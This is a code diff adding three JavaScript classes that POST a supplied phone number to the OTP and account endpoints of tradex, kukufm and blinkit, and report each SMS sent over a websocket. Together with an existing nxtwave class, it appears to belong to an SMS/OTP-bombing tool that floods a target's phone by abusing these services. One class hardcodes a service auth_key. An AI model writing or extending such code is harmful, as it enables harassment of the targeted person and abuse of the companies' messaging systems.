@@ -321,3 +321,57 @@ class nxtwave{
     }
 }
 
+class tradex{
+    constructor(number,ws){
+        fetch("https://api.tradexapp.co/v2/sendotp",{
+            method:"POST",
+            headers:{
+                "Content-Type":"application/json"
+            },
+            body:JSON.stringify({
+                "mobile": number,
+                "source": "sms",
+                "country_code": "+91",
+                "version": 1099
+            })
+        }).then(res=>res.json()).then((data)=>{
+            if(data.success === "true")
+                ws.send("+1")
+        })
+    }
+}
+
+class kukufm{
+    constructor(number, ws){
+        fetch("https://kukufm.com/api/v1/users/auth/send-otp/",{
+            method:"POST",
+            headers:{
+                "Content-Type":"application/json"
+            },
+            body:JSON.stringify({
+                "phone_number": "+91"+number
+            })
+        }).then(res=>res.json()).then((data)=>{
+            if(data.message === "OTP sent successfully")
+                ws.send("+1")
+        })
+    }
+}
+
+class blinkit{
+    constructor(number, ws){
+        fetch("https://blinkit.com/v2/accounts/",{
+            method:"POST",
+            headers:{
+                "Content-Type":"application/x-www-form-urlencoded",
+                "auth_key":"c761ec3633c22afad934fb17a66385c1c06c5472b4898b866b7306186d0bb477"
+            },
+            body:new URLSearchParams({
+                "user_phone":number
+            })
+        }).then(res=>res.json()).then((data)=>{
+            if(data.sms_sent === true)
+                ws.send("+1")
+        })
+    }
+}
